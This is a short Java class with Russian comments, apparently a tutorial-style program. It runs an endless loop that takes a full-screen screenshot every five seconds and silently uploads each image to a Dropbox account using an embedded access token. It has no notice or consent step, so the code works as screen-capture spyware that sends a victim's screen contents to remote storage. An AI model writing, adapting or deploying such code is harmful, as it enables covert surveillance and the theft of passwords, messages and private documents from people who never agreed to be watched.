import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Screenshoter extends Thread {

    public void run(){
        while (true) {

            upload();

            try {
                sleep(5000);
            } catch (Exception e){e.printStackTrace();}
        }
    }

    private static final String ACCESS_TOKEN = "*******";

    public static void upload(){
        //Создаем конфиг подключения к серверу
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        //Создаем клиента
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        try {
            //Отправляем на сервер
            FileMetadata metadata = client.files().uploadBuilder("/ " + getDate("HHmmss_ddMMYYYY") + ".jpg").uploadAndFinish(grabScreen());
        } catch (Exception e) { e.printStackTrace(); }
    }

    private static String getDate(String format){
        //Класс управляющий паттерном даты
        DateFormat dateFormat = new SimpleDateFormat(format);
        //Получаем дату и форматируем её
        String curDate = dateFormat.format(new Date());

        return curDate;
    }

    private static InputStream grabScreen() {
        try {
            //Получаем изображение
            BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));

            //Создаем объект класса ByteArrayOutputStream для записи в него нашего изображения
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

            //Конвертируем BufferedImage в нужный нам тип (ByteArrayOutputStream)
            ImageIO.write(image, "jpg", outputStream);

            //Преобразовываем в конечный тип который нам необходим для загрузки на сервер
            InputStream is = new ByteArrayInputStream(outputStream.toByteArray());

            return is;

        } catch (Exception e) { e.printStackTrace(); }

        return null;
    }
}
